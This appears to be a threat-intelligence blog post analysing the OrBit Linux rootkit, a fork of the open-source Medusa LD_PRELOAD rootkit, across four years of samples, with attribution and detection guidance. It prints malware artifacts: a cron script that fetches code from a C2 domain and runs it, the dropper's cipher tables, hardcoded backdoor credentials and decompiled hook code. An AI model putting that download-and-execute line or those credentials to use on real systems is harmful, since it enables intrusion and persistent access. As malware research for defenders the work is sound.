# OrBit (Re)turns: Tracking an Open-Source Linux Rootkit Across Four Years of Forks and Deployments

> OrBit is a fork of the Medusa open-source LD_PRELOAD rootkit. Samples from 2022 to 2026 show two lineages with rotating keys, credentials and evasion hooks.

- Source: https://research.intezer.com/blog/2026/05/orbit-returns/
- Published: 2026-05-14
- Authors: Nicole Fishbein
- Tags: linux, rootkit
- Attribution: Intezer's Research Team (Intezer Research, https://research.intezer.com/)


## Introduction

In July 2022, we
[published the first analysis](../../../2022/07/orbit-new-undetected-linux-threat/)
of OrBit, a then-undocumented Linux userland-rootkit that stood out for its
comprehensive libc hooking, SSH backdoor access, and PAM-based credential
harvesting. At the time, OrBit appeared as a single sample with a single
operator fingerprint, and the codebase itself looked customized.

It wasn't. As we will show below, OrBit is a repackaged and selectively
weaponized build of [Medusa](https://github.com/ldpreload/Medusa), an
open-source LD_PRELOAD rootkit published on GitHub in December 2022. The story
of OrBit's four-year evolution is not one of novel development; it's the story
of how a publicly available rootkit was forked, configured, and redeployed.

Nearly four years later, OrBit is still in the wild, and it has not stood
still. Hunting across VirusTotal, we pulled more than a dozen samples spanning
2022 through 2026 and walked each one through static and differential analysis.
What we discovered is not a single evolving binary but two parallel lineages: a
full-featured "Lineage A" build that tracks closely with the 2022 original, and
a lite "Lineage B" fork that drops entire capability domains (PAM, pcap,
TCP-port hiding) in exchange for a smaller footprint. Along the way, the
operators rotate XOR keys, shuffle install paths, swap backdoor credentials,
add auditd-evasion hooks, and eventually bolt on a service-side PAM
impersonation primitive.

This blog picks up where the 2022 analysis left off. We focus on what changed,
when, and why it matters for defenders. For each epoch, we enumerate the
samples, call out the lineage, and break down the meaningful changes:
credential changes, hook-set diffs, new evasion behavior, and operator
tradecraft.

## Background: What is OrBit?

For readers unfamiliar with the original analysis, OrBit is a Linux
userland-rootkit deployed as a shared library (.so) that achieves persistence
by patching the dynamic linker, specifically modifying ld.so to ensure the
malicious library is loaded into every process on the system. It operates as a
passive implant with no command-and-control communication; instead, the
attacker connects in through an SSH backdoor. Once installed, OrBit hooks into
PAM functions to harvest credentials from SSH and sudo authentication attempts,
storing the captured passwords locally.

Its evasion capabilities are comprehensive, hooking over forty libc functions
to hide files, processes, and network connections from administrators and
security tools alike. The malware stores its harvested credentials and
configuration data in `/lib/libntpVnQE6mk/`, a directory that remains invisible
to standard enumeration thanks to the rootkit's own hooks.

### July 2022

| Hash       | XOR  | Working dir           | SSH Username | SSH Password  | # Exports | # Hooks | Dropper    |
| ---------- | ---- | --------------------- | ------------ | ------------- | --------- | ------- | ---------- |
| `40b5127c` | 0xA2 | `/lib/libntpVnQE6mk/` | `2l8`        | `c4ss0ul3tt3` | 66        | 54      | `f1612924` |

We will refer to this variant as Lineage A "Full" build of OrBit.

## OrBit Variants Through The Years

In our research, we collected samples from VirusTotal. Unlike PE files, ELF
files don’t include a compilation timestamp, so we started by aggregating the
samples by the date they were submitted to VirusTotal. To track the samples on
the blog, we use the first 8 characters of each sample's SHA-256. At the bottom
of the blog, you can find the full list of IOCs.

### December 2022

The first version shows a slight change: the username and password for the SSH
connection, and the exported functions. Credential mechanism shift: `40b5127c`
resolved the backdoor username dynamically via the getpwuid hook; `ec7462c3`
dropped that hook entirely and hardcodes `adm1n` directly in the XOR-encrypted
string table. The working folder was changed to **libseconf**. For the most
part, the later variants will use this path.

All other capabilities are identical: file I/O interception, stat hiding, PAM
credential capture, TCP port hiding
(alloc_tcp_ports/remove_port/tcp_port_hidden), load monitoring
(.showload/.maxload), pcap sniffing, LD_PRELOAD management, log suppression,
and process hiding.

The transition from 2022 to 2023 is essentially a redeployment with new
credentials and a more convincing install path, plus a minor simplification
(dropping dynamic UID lookup in favor of a hardcoded username).

The rootkit's hook surface stayed stable.

| Hash       | XOR  | Working dir       | SSH Username | SSH Password | # Exports | # Hooks | Dropper    |
| ---------- | ---- | ----------------- | ------------ | ------------ | --------- | ------- | ---------- |
| `ec7462c3` | 0xA2 | `/lib/libseconf/` | `adm1n`      | `asdfasdf`   | 67        | 53      | `8ea420d9` |

### Samples From 2023

| Hash       | XOR  | Working dir               | SSH Username        | SSH Password        | # Exports | # Hooks | Dropper    |
| ---------- | ---- | ------------------------- | ------------------- | ------------------- | --------- | ------- | ---------- |
| `d419a9b1` | 0xA2 | `/lib/fuckwhitehatshome/` | `fuckwhitehatsuser` | `fuckwhitehatspass` | 67        | 53      |            |
| `296d28eb` | 0xA2 | `/lib/libseconf/`         | `adm1n`             | `asdfasdf`          | 65        | 54      |            |
| `3ba6c174` | 0xA2 | `/lib/libseconf/`         | `adm1n`             | (not present)       | 54        | 49      | `26082cd3` |
| `4203271c` | 0xA2 | `/lib/libseconf/`         | `b4ph0m3t0`         | (not present)       | 54        | 49      |            |

The d419a9b1 sample stands out for the operator’s choice of the install path
(/lib/fuckwhitehatshome/) and the SSH username and password. No other known
samples use these strings, suggesting a different operator or persona authored
this particular build rather than it simply being a different deployment of the
same toolkit. Functionally, it carries the full 2022-era hook set, with 65
exports.

The 296d28eb sample is a full-featured build that uses the libseconf path and
the same SSH credentials as ec7462c3. But this sample also has an evolutionary
step: dropped TCP port hiding, added the exported xread function. This is not
an LD_PRELOAD hook on a system library; it’s a wrapper that calls
syscall(SYS_read) directly, bypassing the rootkit’s own hooked read().

The rootkit hooks the libc read() function; the hook filters out rootkit
artifacts from files such as/proc/net/tcp and directory listings. Some C
programs, such as [Git](https://github.com/git/git/blob/master/wrapper.c#L228),
define their own internal xread() helper that wraps read() to handle partial
reads and EINTR. Normally, these internal helpers call libc read(), which the
rootkit intercepts and filters. By exporting its own xread, which directly
calls syscall ([SYS_read](https://filippo.io/linux-syscall-table/)), the
rootkit shadows these program-internal helpers with a version that bypasses its
own read hook entirely. This is a compatibility fix: without it, any program
that defines xread would receive the rootkit’s filtered output through its core
I/O path, potentially corrupting SSH protocol streams, breaking git operations,
or causing other malfunctions that could expose the rootkit’s presence. The
hook ensures that programs continue to function normally while the rootkit’s
read interception remains active for standard libc callers.

This variant is still part of Lineage A.

```c
00417249    uint64_t xread(int32_t fd, int64_t buf, int32_t count)

00417249    {
00417249        int32_t i = count;
0041725b        int32_t bytes_read = 0;
00417262        int32_t var_c = 0;
00417262        
004172ad        do
004172ad        {
0041728a            // SYS_read
0041728a            int32_t read_result = syscall(0, (uint64_t)fd, buf, (uint64_t)i);
0041728a            
00417296            if (read_result <= 0)
00417298                return (uint64_t)bytes_read;
00417298            
004172a0            bytes_read += read_result;
004172a6            i -= read_result;
004172ad        } while (i > 0);
004172ad        
004172af        return (uint64_t)bytes_read;
00417249    }
```

_The exported xread function in sample 296d28eb._

#### 3ba6c174 / 4203271c: Lineage B lite build

Both files, 3ba6c174 and 4203271c, represent the first appearance of Lineage B,
a deliberately lite fork of the OrBit rootkit. Both are dynamically linked
shared objects using the standard 0xA2 XOR key and installed in
`/lib/libseconf/`, but they export only 54 functions, compared to the 67 in
their closest Lineage A contemporaries (d419a9b1, ec7462c3). The 13 removed
exports strip out three entire capability domains: network port-hiding
(alloc_tcp_ports, remove_port, tcp_port_hidden, clean_ports), PAM credential
interception (pam_authenticate, pam_acct_mgmt, pam_open_session,
pam_get_password), and packet capture (pcap_loop, pcap_packet_callback). The
string table reflects this (.logpam and .udp are absent), though .ports,
.hosts, and sshpass2.txt are retained. This reduced feature set suggests they
were purpose-built for different target environments where a smaller footprint
or more limited functionality was either sufficient or preferred.

The most notable change is the complete absence of a backdoor password. Every
Lineage A sample embeds a password in its XOR-encrypted string block, but in
both `3ba6c174` and `4203271c`, the password field is missing. Each sample
carries a distinct username (`adm1n` and `b4ph0m3t0`, respectively), and these
are the only byte-level differences between the two binaries. This pattern of
54 exports, no password, no PAM/pcap hooks, held consistent across all
subsequent Lineage B samples through 2024.

### Samples From 2024

| Hash       | XOR  | Working dir         | SSH Username | SSH Password      | # Exports | # Hooks | Dropper    |
| ---------- | ---- | ------------------- | ------------ | ----------------- | --------- | ------- | ---------- |
| `eea274ed` | 0xAA | `/lib64/libseconf/` | `Y0u4reCu6e` | `1qaz@WSX3edc123` | 66        | 54      |            |
| `a6138638` | 0xAA | `/lib/locate/`      | `Y0u4reCu6e` | `1qaz@WSX3edc123` | 66        | 54      |            |
| `a34299a1` | 0xA2 | `/lib/libseconf/`   | `rebel`      | (not present)     | 56        | 49      |            |
| `b1dd18a6` | 0xA2 | `/lib/libseconf/`   | `Gestuff`    | (not present)     | 54        | 49      | `fc2e0cb6` |
| `989f7eb4` | 0xA2 | `/lib/libseconf/`   | `adm1n`      | (not present)     | 54        | 49      | `48a68d05` |

2024 is the most diverse epoch in OrBit's timeline, with both lineages active
simultaneously and an encryption key change in the Lineage A branch.

#### eea274ed / a6138638: Lineage A, 0xAA key rotation

These two samples belong to the same lineage: identical XOR key (0xAA is a
break from the long-standing 0xA2), identical credentials (`Y0u4reCu6e` /
`1qaz@WSX3edc123`), and identical hook count (54). The only structural
difference is the install path: `/lib64/libseconf/` versus `/lib/locate/`. This
is probably a deliberate path rotation to evade detections anchored on the
previously documented `/lib/libseconf/` directory. Credentials are stored
inline in the XOR-encrypted block rather than written to `sshpass.txt`,
representing a shift in the credential storage model. Both samples also have a
reduced hook for the' execve' function: the `execve` hook handles persistence
maintenance (apt/yum), output sanitization (dmesg), and ldd defeat. Compared to
other samples in the lineage, it is a reduced feature set: no strace
interception, no IP/iptables hooks, no command logging.

Despite sharing the same hook count, the two samples do not share the same hook
set. `a6138638` swaps read/write for readdir_r/readdir64_r, indicating a
targeted adjustment to the directory-hiding mechanism. A string-level diff
reveals more changes:

- Credential harvesting is saved in `remote.txt`.
- This variant captures only SSH logins, not sudo sessions (`[sudo] pass` is
  missing).

The result is 52 decoded XOR strings in `eea274ed` versus 47 in `a6138638`.
Both samples retain `.udp`, `.pts`, and the credential pair, preserving the
core backdoor functionality. The removals target logging and forensic-capture
features, suggesting `a6138638` was tailored for a deployment where a lighter
footprint was preferred.

#### a34299a1 / b1dd18a6 / 989f7eb4: Lineage B continuation

These samples continue the 54-export lite build lineage that first appeared in
2023 with `3ba6c174`/`4203271c`. The hook set is identical (49 hooks), the XOR
key remains 0xA2, and the same capability domains are absent: no PAM credential
interception, no pcap sniffing, no TCP port hiding. The password field is still
missing from the binary. Each sample carries a distinct username (`rebel`,
`Gestuff`, `adm1n`, respectively), consistent with the Lineage B pattern of
per-deployment username rotation, with no corresponding password.

`989f7eb4` is the payload extracted from the `48a68d05` dropper. It was not on
VT; we uploaded it.

### Samples From 2025

| Hash       | XOR  | Working dir       | SSH Username | SSH Password | # Exports | # Hooks | Role                                     |
| ---------- | ---- | ----------------- | ------------ | ------------ | --------- | ------- | ---------------------------------------- |
| `8e83cbb2` | 0xA2 | `/lib/libseconf/` | `infinity`   | `302010`     | 66        | 54      | payload .so                              |
| `2b2eeb22` | 0xA2 | `/lib/libseconf/` | `adm1n`      | `asdfasdf`   | 64        | 54      | payload .so (extracted from `d3d204c1`)  |
| `84828f31` | 0xA2 | `/lib/libseconf/` | `adm1n`      | `asdfasdf`   | 64        | 54      | truncated copy of `2b2eeb22`             |
| `090b15fd` | ---  | ---               | ---          | ---          | ---       | ---     | dropper (carries `8e83cbb2`)             |
| `64a3ebd3` | ---  | ---               | ---          | ---          | ---       | ---     | dropper (carries `8e83cbb2`)             |
| `b85ed157` | ---  | ---               | ---          | ---          | ---       | ---     | dropper (carries `8e83cbb2`)             |
| `d3d204c1` | ---  | ---               | ---          | ---          | ---       | ---     | dropper (carries `2b2eeb22`)             |
| `73b95b7d` | n/a  | ---               | ---          | ---          | ---       | ---     | infector (carries 090b15fd as inner ELF) |

The 2025 epoch marks two significant capability additions to Lineage A and
confirms the rootkit's return to the 0xA2 encryption key after the 2024 0xAA
experiment.

Two distinct rootkit .so builds are present in 2025, both Lineage A:

`8e83cbb2` represents the most capable build to date. Its 66-export set
includes a significant new hook not seen in any prior variant:
`pam_sm_authenticate`. This is the PAM service-side authentication function,
meaning the rootkit now hooks both sides of the PAM stack. Where earlier
variants could only passively capture credentials via client-side
`pam_authenticate`, this build can also forge authentication outcomes, allowing
the attacker to approve or deny login attempts at will. The export set also
includes `xread`, first seen in `296d28eb` (2023).

`2b2eeb22` is a second Lineage A payload with 64 exports. XOR 0xA2 decode
confirms credentials `adm1n`/`asdfasdf`, the same operator behind `ec7462c3`
(2022), `296d28eb` (2023), and the `26082cd3` inner payload (2024), now
spanning four years. `84828f31` is a truncated copy of `2b2eeb22` (same
BuildID: `cbc9724027399723a27daa4114ffcdf906cb802f`, identical bytes up to
107KB, missing the trailing 102KB containing section headers and symbol
tables), it is likely an incomplete extraction or download artifact. It is not
a distinct sample.

XOR 0xA2 string decode of both payloads confirms the full Lineage A string set
is restored: `sshpass.txt` and `sshpass2.txt` both present, plus `.logpam`,
`.udp`, `.ports` (×2), `/proc/net/tcp`. The string removals introduced by the
2024 0xAA cluster (`a6138638`'s missing `local.txt`, `sniff.txt`, etc.) were
not carried forward, and both builds return to the comprehensive logging and
credential-capture model.

#### Dropper Samples

`090b15fd`, `64a3ebd3`, and `b85ed157` are statically linked ELF executables
that carry `8e83cbb2` as an embedded .so and share the same
`Build ID: da256c78910c552eb334814ada85c7655b717c4f`. `d3d204c1` is the same
type of dropper carrying `2b2eeb22`. All four share the same architecture first
seen in `f1612924` (from 2022).

##### 73b95b7d: A New Dropper Architecture

`73b95b7d` is not just a dropper, it is an infector that carries the dropper as
an embedded payload. This creates a two-stage delivery chain: infector →
dropper → rootkit.

The inner binary (`090b15fd`, embedded at file offset `0x20d7`) is the dropper
we previously saw. The infector's role is propagation and persistence; the
dropper's role is to extract and install the rootkit `.so` via `ld.so.preload`.

The infector scans the filesystem for ELF binaries and injects the second-stage
payload into them. An infection marker `bongripz4jezuz` (stored in base64
encoding as: `Ym9uZ3JpcHo0amV6dXoK`) is checked before each infection attempt
to avoid re-infecting the same target. The injected binaries include:

- `/bin/ls`
- All 64-bit ELF files in the current working directory that have read/write
  access.

Additionally, `/etc/cron.hourly/0` is created as a persistence mechanism (to
download and execute a remote payload), though it is a shell script rather than
an ELF injection target.

```sh
#!/bin/sh
wget --quiet http://cf0[.]pw/0/etc/cron.hourly/0 -O- 2>/dev/null|sh>/dev/null 2>&1
```

This is the first OrBit component with any form of C2 communication. Every
previous version was a purely passive implant, meaning the attacker connected
via the SSH backdoor.

This introduces an external command channel that can deliver updated payloads
or instructions, adding a reinfection mechanism on top of `ld.so.preload`
persistence.

The earlier droppers stored all paths and commands as plaintext. `73b95b7d` is
the first dropper to implement string protection: a custom substitution cipher
using two lookup tables at `.data` offsets for the cipher and plain, each with
88 entries, defining a character-by-character mapping. Notably, this is a
different scheme from the XOR encryption used by the previous rootkit payloads.

```c++
char mw_plain_table[0x4e] = "0123456789abcdefghijklmnopqrstuvzywxABCDEFGHIJKLMNOPQRSTUVZYWX|:. !#-/;&*\'\"\n\r", 0
char mw_cipher_table[0x58] = "<>@o$:,.l+*^?=)(|AB&%;D{!wkUxzvutsrqp_nm-ihgfFCcba~K23456789eyd1XSNQWTZMIRHGVOYLjPJE/][", 0
```

##### Connection to RHOMBUS

The structure of this dropper, which delivers the OrBit payload in the final
stage, is identical to that described in this
[APNIC blog](https://blog.apnic.net/2020/05/22/rhombus-a-new-iot-malware/) that
analyzed a dropper that delivered RHOMBUS malware.

Rhombus is a Linux-based botnet malware first reported in February 2020 by the
[MalwareMustDie research group](https://old.reddit.com/r/LinuxMalware/comments/fh3zar/memo_rhombus_an_elf_bot_installerdropper/),
which analyzed and shared samples of it. It acts as an installer/dropper that
persists on infected devices, drops a second-stage payload, and then uses the
compromised system for DDoS activity. The target systems are VPS and IoT
devices. (SHA256 of the dropper:
`b982276458a85cd3dd7c8aa6cb4bbb2d4885b385053f92395a99abbfb0e43784`).

Interestingly, the dropper `73b95b7d` that delivers the OrBit payload in the
final stage is identical to the one used in the Rhombus campaign 6 years ago.
Coincidentally, both droppers use the same domain to download the payload as
part of the cron-job-based persistence. The current resolution of the domain is
to `109.95.212[.]253`. The host has a unique BANNER_0_HASH-IP value,
`ba0c31785465186600a76b7af2a37aa6`, that is shared with only one other IP,
`109.95.211[.]141`, as shown in the screenshot below from Validin. Based on the
ASN resolution, both IP addresses are located in Russia.

The fact that the OrBit dropper shares the same domain as malware from 6 years
ago can also be interpreted as an attempt to mislead researchers; therefore, we
are not taking this evidence into account for attribution at this moment.
However, it is worth noting that this connection exists.

![Screenshot from Validin showing the two IPs sharing the same banner hash.](images/fig1.png "Shared BANNER_0_HASH-IP value.")

![Screenshot from Validin showing the resolution of a domain to one of the IP addresses](images/fig2.png "Resolution of http://cf0[.]pw")

### Samples From February 2026

| Hash       | XOR  | Working dir       | SSH Username | SSH Password      | # Exports | # Hooks |
| ---------- | ---- | ----------------- | ------------ | ----------------- | --------- | ------- |
| `04c06be0` | 0xA2 | `/lib/libseconf/` | `jokerteam`  | `HACK89SERVER`    | 64        | 54      |
| `d7b487d2` | 0xA2 | `/lib/libseconf/` | `57ill4Cu63` | `1qaz@WSX3edc098` | 64        | 54      |

These two samples are confirmed to be identical in structure: the same 54-hook
set, the same XOR key (0xA2), and the same working directory
(`/lib/libseconf/`). The only difference is credentials:
`jokerteam`/`HACK89SERVER` versus `57ill4Cu63`/`1qaz@WSX3edc098`. XOR 0xA2
decode confirms the full Lineage A string set.

No Lineage B samples have surfaced since 2024, suggesting the lite build may
have been retired or consolidated back into the main branch.

### Connection to BLOCKADE SPIDER

In CrowdStrike’s 2026 Global Threat
[Report](https://www.crowdstrike.com/explore/2026-global-threat-report), they
mention that
[BLOCKADE SPIDER](https://www.crowdstrike.com/en-us/adversaries/blockade-spider/)
used the OrBit backdoor to maintain persistence and stealthy access to
virtualization environments.

BLOCKADE SPIDER is a CrowdStrike-tracked eCrime adversary that has been active
at least since 2024. They are known for running Embargo ransomware campaigns
using sophisticated, multi-domain attack techniques.

## Origin: OrBit is a Fork of the Medusa Open-Source Rootkit

Mandiant's reporting on
[UNC3886 espionage operations](https://cloud.google.com/blog/topics/threat-intelligence/uncovering-unc3886-espionage-operations)
identifies MEDUSA and its installer, SEAELF, as tools used by this
state-sponsored actor against Juniper and VMware infrastructure. Essentially,
OrBit is built from Medusa, an open-source LD_PRELOAD rootkit published on
GitHub ([github.com/ldpreload/Medusa](http://github.com/ldpreload/Medusa)) in
December 2022.

Mandiant's MEDUSA configuration table matches our 2024 Lineage A 0xAA-key
cluster exactly across four independent fields: the XOR key `0xAA`, the
backdoor credentials `Y0u4reCu6e` and `1qaz@WSX3edc123`, the install path
/lib/locate/, and a modification to the rootkit that redirects strace output to
`/tmp/orbit.txt`. That literal `orbit` filename, preserved as a plaintext
artifact inside UNC3886's MEDUSA binary, is direct cross-attribution:
Mandiant's "MEDUSA" sample set and our "OrBit" 2024 cluster are the same
builds.

We compiled Medusa from source and compared the resulting binaries
byte-for-byte against our OrBit corpus. The match is unambiguous, and it
rewrites the attribution and evolution story.

### Evidence of the Fork

The first is a function-set and export match. Compiling Medusa's
[src/rkld.c](https://github.com/ldpreload/Medusa/blob/master/src/rkld.c)
against the default
[Makefile recipe](https://github.com/ldpreload/Medusa/blob/master/Makefile#L30)
produces a shared object whose function set, hook list, and XOR-obfuscated
string table are a direct superset match for OrBit Lineage A samples. The 2022
OrBit baseline (`ec7462c3`) shares all core exports with the Medusa build and
reuses the identical XOR 0xA2 string obfuscation scheme driven by Medusa's
build-time
[xor_dump() pipeline](https://github.com/ldpreload/Medusa/blob/master/src/config.c#L180),
with the XOR key itself hardcoded in
[config.c](https://github.com/ldpreload/Medusa/blob/master/src/config.c#L349).

The second is a source-filename fingerprint that is present in almost every
sample we analyzed. Some of the samples ship with an unstripped ELF `.symtab`.
The resulting filenames are preserved verbatim: rootkit samples carry `rkld.c`
and, when Lineage A is linked in, `rknet.c`, while loader samples carry
`rkload.c`. Those are the exact names of Medusa's source files,
[src/rkld.c](https://github.com/ldpreload/Medusa/blob/master/src/rkld.c),
[src/rknet.c](https://github.com/ldpreload/Medusa/blob/master/src/rknet.c), and
[src/rkload.c](https://github.com/ldpreload/Medusa/blob/master/src/rkload.c).
The filenames themselves are not secret, since the Medusa repository is public,
but their verbatim presence in the compiled binary is a strong attribution
anchor: every unstripped sample directly identifies the upstream tree it was
built from. Of the samples in our corpus, only three are fully stripped (the
2025 dropper `73b95b7d`, and the rootkit binaries `a6138638` and `b9822764`).
Three representative samples are shown below: a full Lineage A rootkit
(`ec7462c3`, 2022), a Lineage B lite rootkit (`3ba6c174`, 2023), and the SEAELF
loader (`26082cd3`, 2024).

```sh
$ readelf -s ec7462c3f4a874... | awk '/FILE    LOCAL/'
    25: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    34: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS rkld.c
    40: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS rknet.c
    46: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c

$ readelf -s 3ba6c174a72e4b... | awk '/FILE    LOCAL/'
     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
     9: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS rkld.c
    15: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c

$ readelf -s 26082cd36fdaf7... | awk '/FILE    LOCAL/'
     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
     9: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS rkload.c
    14: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
```

The Lineage A rootkit carries both `rkld.c` and `rknet.c`; the Lineage B
rootkit, which omits the advanced hook set, carries only `rkld.c`; and the
loader carries `rkload.c`. The same pattern holds across the wider corpus.

Alongside the filename fingerprint, the loader's entry-point dispatch, its
[build_root()](https://github.com/ldpreload/Medusa/blob/master/src/rkload.c#L67)
filesystem layout (`.boot.sh`, `.logpam`, `sshpass.txt`, `sshpass2.txt`,
`.ports`), and its SELinux `setxattr` sequence all map one-to-one to the Medusa
source.

The third is an embedded inner ELF produced by `xxd -i`. Medusa's Makefile
embeds `build/rkld.so` into the loader using the
[xxd -i build/rkld.so > build/rkld.h](https://github.com/ldpreload/Medusa/blob/master/Makefile#L31)
step, which is then included by the loader compiled at
[Makefile line 33](https://github.com/ldpreload/Medusa/blob/master/Makefile#L33).
OrBit's loader binaries follow this pattern: a `rkld.so` blob embedded as a C
byte array within the loader ELF, dropped to disk at runtime. The embedding
technique, offset layout, and post-drop execution flow are identical.

### Per-Module Source Mapping

Medusa's source tree maps cleanly onto the OrBit binary set we have tracked:

| Medusa source | Role                                                                                                               | Corresponding OrBit artifact                                                     |
| ------------- | ------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------- |
| src/rkld.c    | Main rootkit (libc hooks, PAM harvest, file/proc/net hiding)                                                       | All Lineage A / Lineage B rootkit .so samples                                    |
| src/rkload.c  | Installer / SEAELF loader (patches ld.so, writes /etc/ld.so.preload, drops inner rootkit)                          | 26082cd3 and related loader/installer samples                                    |
| src/rknet.c   | Advanced hooks: xread, audit_log_acct_message, audit_log_user_message, pam_sm_authenticate, pcap_loop, port-hiding | Not compiled in the default Makefile. Linked in only in Lineage A "full" builds. |

The Medusa default `Makefile` compiles only `src/rkld.c`. Every Lineage A
capability that appeared to "arrive" in OrBit between 2023 and 2025 was already
present as source in Medusa's `src/rknet.c` on day one of the public release.
The operators' work was to modify the Makefile to link `rknet.c` into their
build, not to author those functions.

### Timeline Anomaly

Our analysis shows that an initial OrBit sample (`40b5127c`) appeared in July
2022, predating the repository's publication by approximately 5 months. Based
on this information, there are two options: either the Medusa author published
a privately-circulated rootkit source that had already been deployed
operationally, or the earliest OrBit sample was built from a pre-publication
snapshot of the same tree. Either way, the 2022 OrBit sample and the December
2022 Medusa source tree are the same codebase. The question is only which
commit was made public first.

### Implications

The appearance of a single rootkit family across four years does not imply a
single operator. OrBit and Medusa have been built and deployed by at least
three unrelated actor clusters we can presently distinguish, including the
state-sponsored espionage activity attributed to UNC3886, the eCrime ransomware
operations run by BLOCKADE SPIDER, and the 2025 cron-dropper campaign
previously linked to RHOMBUS infrastructure. Attribution at the family level is
therefore not enough, and defenders tracking an OrBit infection should separate
the questions of which codebase was used from which operator configured and
deployed it.

Tracking version-over-version changes in OrBit reads less like an active
malware development project and more like a record of build-flag toggles,
credential rotations, and install-path swaps against a stable upstream. The
capability ceiling is set by the Medusa source tree as it existed in December
2022, and every apparent new feature we observed between 2023 and 2025 was
already present in that tree, waiting for an operator to link it in. The
[xread read-hook bypass](https://github.com/ldpreload/Medusa/blob/master/src/rknet.c#L118)
we first flagged as a 2023 compatibility shim is a function in `src/rknet.c`.
The auditd evasion pair we called out as a 2024 addition,
[audit_log_acct_message](https://github.com/ldpreload/Medusa/blob/master/src/rknet.c#L192)
and
[audit_log_user_message](https://github.com/ldpreload/Medusa/blob/master/src/rknet.c#L235),
sits in the same file. The PAM stack we noted as gradually expanding across
versions, including
[pam_authenticate](https://github.com/ldpreload/Medusa/blob/master/src/rknet.c#L305),
[pam_acct_mgmt](https://github.com/ldpreload/Medusa/blob/master/src/rknet.c#L350),
[pam_open_session](https://github.com/ldpreload/Medusa/blob/master/src/rknet.c#L365),
and the 2025 service-side impersonation hook
[pam_sm_authenticate](https://github.com/ldpreload/Medusa/blob/master/src/rknet.c#L381),
is all present in the same `rknet.c`, as is the
[pcap_loop](https://github.com/ldpreload/Medusa/blob/master/src/rknet.c#L491)
packet hook that appears in full Lineage A builds. None of these files is
linked in by the
[default Makefile recipe](https://github.com/ldpreload/Medusa/blob/master/Makefile#L30),
which compiles only `src/rkld.c`. Their arrival in individual OrBit samples
corresponds to an operator modifying the build to include rknet.c, not to new
code being written.

Signatures based on invariants of the Medusa build pipeline will also flag
builds from operators we have not yet seen. Three such invariants are worth
calling out.

- The string table produced by Medusa's
  [xor_dump() routine](https://github.com/ldpreload/Medusa/blob/master/src/config.c#L180),
  which emits every protected string as a contiguous block of single-byte
  XOR-obfuscated byte arrays within the compiled binary. Operators change the
  key value (0xA2 in most builds, 0xAA in the 2024 UNC3886 cluster) and some
  paths, but the table's shape and the majority of its entries are fixed by the
  source. A YARA rule that decodes the table with a variable single-byte key
  and matches on a threshold count of known plaintext strings catches any
  build, regardless of which key was chosen.
- The filesystem skeleton that the loader's
  [build_root()](https://github.com/ldpreload/Medusa/blob/master/src/rkload.c#L67)
  writes into its install directory. Operators vary only the parent directory
  (`/lib/libseconf/`, `/lib/locate/`, `/lib/libntpVnQE6mk/`), so host-based
  detection can alert on the co-occurrence of that filename set inside any
  directory, and binary-level signatures can match the embedded filename
  constants and the `setxattr` call pattern directly.
- The nested-ELF structure produced by the
  [xxd - +i build/rkld.so > build/rkld.h](https://github.com/ldpreload/Medusa/blob/master/Makefile#L31)
  step in the Makefile, which bakes a full secondary ELF into the loader's
  `.rodata`. Every Medusa loader therefore carries a second ELF magic inside
  its own image, followed by a length constant, and, if the binary is not
  stripped, two `xxd`-generated symbols (`rkld_so` and `rkld_so_len` ). The
  nested-ELF shape on its own is not specific enough to be a detection
  signature: plenty of legitimate software and unrelated malware use `xxd -i`
  or equivalent techniques to embed a payload, and any such binary will match a
  naive "second ELF at non-zero offset plus length constant" rule. The
  Medusa-specific part is the pairing of that structural pattern with (a) the
  symbol names `rkld_s`o and `rk +ld_so_len` in the loader's symbol table when
  the binary is not stripped, and (b) the inner ELF itself, matching the
  rootkit fingerprint described earlier in this section, which gives both a
  family-level anchor and a structural one.

## Conclusion

The analysis of OrBit variants from 2022 through early 2026 reveals a Linux
rootkit whose code later surfaced in an open-source codebase named Medusa. This
suggests that the backdoor was created before its public release and has since
been selectively forked, configured, and redeployed by multiple operators over
four years. We identified two parallel build paths: the comprehensive Lineage A
("Full" build), which links in Medusa's `src/rknet.c` advanced hook set, and
the temporary Lineage B (lite build), which ships only the `src/rkld.c` core
and was retired after 2024. Apparent "milestones" in Lineage A are the xread
wrapper (2023), the audit_log\_\* auditd-evasion hooks (2024), and the 2025
addition of the `pam_sm_authenticate` hook, which corresponds one-to-one with
functions already present in Medusa's published source. The operator work is in
the build configuration and deployment, not the C code.

Our analysis of the OrBit samples also discovered that at least 3 different
operators are using the backdoor. A major operational shift occurred in 2025
with the introduction of a new two-stage infector architecture, marking one
operator's transition from a purely passive SSH-backdoor implant to malware
with its first direct C2 capability. This infector utilizes a cron job to fetch
external payloads from the domain cf0[.]pw. The architecture of this new
dropper is identical to one used in the 2020 RHOMBUS botnet campaign,
suggesting shared tooling or operator overlap, a link further cemented by the
C2 domain resolving to infrastructure located in Russia. In parallel, the same
Medusa codebase was weaponized upstream by the state-sponsored espionage actor
UNC3886 (tracked by Mandiant). The 2024 0xAA-key cluster we tracked as Lineage
A corresponds exactly to UNC3886's MEDUSA configuration, including the backdoor
credentials, the install path, and a strace artifact that retains the literal
"orbit" string. The rootkit has also been adopted by the CrowdStrike-tracked
eCrime adversary BLOCKADE SPIDER since at least 2024, who leverage OrBit for
stealthy persistence against VMware vCenter infrastructure to facilitate the
deployment of Embargo ransomware. The continued emergence of new Lineage A
samples in 2026, accompanied by operator-specific credential rotation, confirms
that a single public rootkit codebase is being cloned and configured by
multiple unrelated actor groups.

## IOC Table

| SHA256                                                           | Year | Role                 | Lineage |
| ---------------------------------------------------------------- | ---- | -------------------- | ------- |
| 40b5127c8cf9d6bec4dbeb61ba766a95c7b2d0cafafcb82ede5a3a679a3e3020 | 2022 | payload              | A       |
| ec7462c3f4a87430eb19d16cfd775c173f4ba60d2f43697743db991c3d1c3067 | 2022 | payload              | A       |
| f1612924814ac73339f777b48b0de28b716d606e142d4d3f4308ec648e3f56c8 | 2022 | dropper              | -       |
